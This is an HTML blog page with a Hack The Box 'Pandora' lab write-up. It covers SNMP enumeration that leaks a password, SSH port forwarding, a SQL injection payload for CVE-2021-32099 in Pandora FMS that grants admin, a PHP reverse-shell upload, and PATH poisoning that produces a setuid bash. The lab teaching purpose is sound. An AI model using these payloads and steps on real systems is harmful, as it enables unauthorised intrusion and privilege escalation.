@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Pandora Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-05-21-pandora/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Pandora Hackthebox writeup">
+  <meta property="og:description" content="In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-21T00:51:12+02:00">
+    <meta property="article:modified_time" content="2022-05-21T00:51:12+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Snmp">
+    <meta property="article:tag" content="Port-Forwarding">
+    <meta property="article:tag" content="Path-Poisoning">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pandora Hackthebox writeup">
+  <meta name="twitter:description" content="In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-05-21-pandora/" /><link rel="prev" href="http://example.org/posts/web-exploitation/2022-05-19-kryptos-support/" /><link rel="next" href="http://example.org/posts/linux-machines/2022-06-27-napping/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Pandora Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-05-21-pandora\/"
+        },"genre": "posts","keywords": "Hackthebox, snmp, port-forwarding, Path-Poisoning","wordcount":  745 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-05-21-pandora\/","datePublished": "2022-05-21T00:51:12+02:00","dateModified": "2022-05-21T00:51:12+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pandora Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-05-21">2022-05-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;745 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#pwned">pwned</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>initial scan :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -A -T <span class="m">4</span> <span class="nv">$IP</span> -oN nmap/intial.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Play <span class="p">|</span> Landing
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<p>And i have learned the lesson from previous machines so will scan udp as well just in case</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -sU  10.10.11.136
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">161/udp   open     snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+</span></span><span class="line"><span class="cl">17219/udp filtered chipper
+</span></span><span class="line"><span class="cl">17989/udp filtered unknown
+</span></span><span class="line"><span class="cl">46532/udp filtered unknown</span></span></code></pre></div></div>
+<h1 id="enumeration-">Enumeration :</h1>
+<ul>
+<li>port 80 : the web page :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220120195335.png"
+        data-srcset="/assets/images/pandora/20220120195335.png, /assets/images/pandora/20220120195335.png 1.5x, /assets/images/pandora/20220120195335.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220120195335.png"
+        title="error" /></p>
+<p>there is only this form where we can send data , parameters are :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">fullName=ADam<span class="p">&amp;</span>email=adma@testet.com<span class="p">&amp;</span>phone=a<span class="p">&amp;</span>message=a</span></span></code></pre></div></div>
+<p>testing them for sqli , ssti and more found out this is just a rabbit Hole :&rsquo;')</p>
+<ul>
+<li>we have found in the udp scan <strong>snmp</strong> is open so let&rsquo;s enumerate it , trying to enumerate with the community string &ldquo;public&rdquo; it works and we got results :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">snmpwalk -c public -v1 10.10.11.136 &gt; snmpwalk.out</span></span></code></pre></div></div>
+<p>you can query about one thing with <code>snmpwalk</code> But i want to see all the data , finally will see this in the output</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iso.3.6.1.2.1.25.4.2.1.5.3068 <span class="o">=</span> STRING: <span class="s2">&#34;-u daniel -p HotelBabylon23&#34;</span></span></span></code></pre></div></div>
+<p>so we have a potential username and a password , we can try ssh with it :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh daniel@10.10.11.136</span></span></code></pre></div></div>
+<h1 id="foothold-">Foothold :</h1>
+<p>i have logged in with <code>daniel</code> However user <code>matt</code> is the one contains the <code>user.txt</code> and he only can read it</p>
+<p>we need to escalate to <code>matt</code> then <code>root</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521124027.png"
+        data-srcset="/assets/images/pandora/20220521124027.png, /assets/images/pandora/20220521124027.png 1.5x, /assets/images/pandora/20220521124027.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521124027.png"
+        title="error" /></p>
+<p>after a lot of enumeration we will see :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521124108.png"
+        data-srcset="/assets/images/pandora/20220521124108.png, /assets/images/pandora/20220521124108.png 1.5x, /assets/images/pandora/20220521124108.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521124108.png"
+        title="error" /></p>
+<p>the web page we have seen above is for the <code>html</code> But what about <code>pandora</code> ?</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521112241.png"
+        data-srcset="/assets/images/pandora/20220521112241.png, /assets/images/pandora/20220521112241.png 1.5x, /assets/images/pandora/20220521112241.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521112241.png"
+        title="error" /></p>
+<p>and we will see it is owned by the user <code>matt</code> which we are targeting.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521123919.png"
+        data-srcset="/assets/images/pandora/20220521123919.png, /assets/images/pandora/20220521123919.png 1.5x, /assets/images/pandora/20220521123919.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521123919.png"
+        title="error" /></p>
+<p>so it seems we need to do <strong>Port forwarding</strong> to interact with this page at the Browser.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># @ your side</span>
+</span></span><span class="line"><span class="cl">sudo ssh -N -L 0.0.0.0:9999:127.0.0.1:80 daniel@10.10.11.136</span></span></code></pre></div></div>
+<p>that will let us see this web page at <code>http://127.0.0.1:9999</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220120200414.png"
+        data-srcset="/assets/images/pandora/20220120200414.png, /assets/images/pandora/20220120200414.png 1.5x, /assets/images/pandora/20220120200414.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220120200414.png"
+        title="error" /></p>
+<p>and we can see the version at the bottom of the page : <strong><code>v7.0NG.742_FIX_PERL2020</code></strong></p>
+<p>searching for Vulnerabilities for this version will find <strong><code>CVE-2021-32099</code></strong> which is SQL injection in the session_id , and the payload is <a href="https://github.com/ibnuuby/CVE-2021-32099" target="_blank" rel="noopener noreffer ">here</a> and it is explained in the blog <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained" target="_blank" rel="noopener noreffer ">here</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:9999/pandora_console/include/chart_generator.php?session_id<span class="o">=</span>a<span class="s1">&#39; UNION SELECT &#39;</span>a<span class="s1">&#39;,1,&#39;</span>id_usuario<span class="p">|</span>s:5:<span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="s1">&#39; as data FROM tsessions_php WHERE &#39;</span>1<span class="s1">&#39;=&#39;</span><span class="m">1</span></span></span></code></pre></div></div>
+<p>all we need to do is to go back to <strong><code>http://127.0.0.1:9999/pandora_console/</code></strong>
+and we will have admin access as the admin cookie has been added</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220120200737.png"
+        data-srcset="/assets/images/pandora/20220120200737.png, /assets/images/pandora/20220120200737.png 1.5x, /assets/images/pandora/20220120200737.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220120200737.png"
+        title="error" /></p>
+<p>Hence the site works with <strong>PHP</strong> we can know that from <strong>wappalayzer</strong> extension, so we need to upload a php reverse shell .</p>
+<p>It is located at <code>/usr/share/webshells/php/php-reverse-shell.php</code> in Linux or you can download it <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer ">here</a> By watching <a href="https://www.youtube.com/watch?v=KX_jZsdgsJE&amp;ab_channel=k4m1ll0-hackingchannel" target="_blank" rel="noopener noreffer ">here</a> we need to zip it then we can execute it at <strong><code>/pandora_console/extensions/shell.php</code></strong></p>
+<p>upload it at</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin tools &gt; extensions manager &gt; extension uploader</span></span></code></pre></div></div>
+<p>Then set your listener and will get the shell after execute it at
+<code>/pandora_console/extensions/shell.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220120204254.png"
+        data-srcset="/assets/images/pandora/20220120204254.png, /assets/images/pandora/20220120204254.png 1.5x, /assets/images/pandora/20220120204254.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220120204254.png"
+        title="error" /></p>
+<p>Once we are in we can generate ssh keys to get a stable shell</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kali@kali:~$ ssh-keygen -f pandora</span></span></code></pre></div></div>
+<ul>
+<li>normally we &rsquo;d use</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-copy-id -i pandora.pub matt@10.10.11.136</span></span></code></pre></div></div>
+<p>But hence we don&rsquo;t know matt&rsquo;s password , we would copy our key manually and add it to <code>authorized_keys</code> at matt&rsquo;s side</p>
+<p>now copy <code>pandora.pub</code> into <code>authorized_keys</code> at the target machine , you can connect now:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kali@kali:~$  ssh matt@10.10.11.136 -i pandora</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521120958.png"
+        data-srcset="/assets/images/pandora/20220521120958.png, /assets/images/pandora/20220521120958.png 1.5x, /assets/images/pandora/20220521120958.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521120958.png"
+        title="error" /></p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Searching for SUID binaries found :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521121149.png"
+        data-srcset="/assets/images/pandora/20220521121149.png, /assets/images/pandora/20220521121149.png 1.5x, /assets/images/pandora/20220521121149.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521121149.png"
+        title="error" /></p>
+<p>The <code>/usr/bin/pandora_backup</code> seems odd , we can explore it with <strong>strings</strong> but it is not installed on the box , we can move it to our side and explore it or Just try <code>strace</code> first</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strace /usr/bin/pandora_backup</span></span></code></pre></div></div>
+<p>we can see in the output :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied</span></span></code></pre></div></div>
+<p>it seems it uses <code>tar</code> command without providing Full path so that may let us do <strong>Path Poisoning</strong> .</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;cp /bin/bash /tmp/bash ; chmod +s /tmp/bash&#34;</span> &gt; tar
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> tar
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/pandora/20220521121710.png"
+        data-srcset="/assets/images/pandora/20220521121710.png, /assets/images/pandora/20220521121710.png 1.5x, /assets/images/pandora/20220521121710.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/pandora/20220521121710.png"
+        title="error" /></p>
+<h3 id="pwned">pwned</h3></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-05-21</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-05-21-pandora/" data-title="Pandora Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,snmp,port-forwarding,Path-Poisoning"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-05-21-pandora/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-05-21-pandora/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-05-21-pandora%2f&amp;text=Pandora%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/snmp/">Snmp</a>,&nbsp;<a href="/tags/port-forwarding/">Port-Forwarding</a>,&nbsp;<a href="/tags/path-poisoning/">Path-Poisoning</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web-exploitation/2022-05-19-kryptos-support/" class="prev" rel="prev" title="Kryptos Support challenge Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Kryptos Support challenge Writeup</a>
+            <a href="/posts/linux-machines/2022-06-27-napping/" class="next" rel="next" title="napping 1.0.1 vulnhub writeup">napping 1.0.1 vulnhub writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
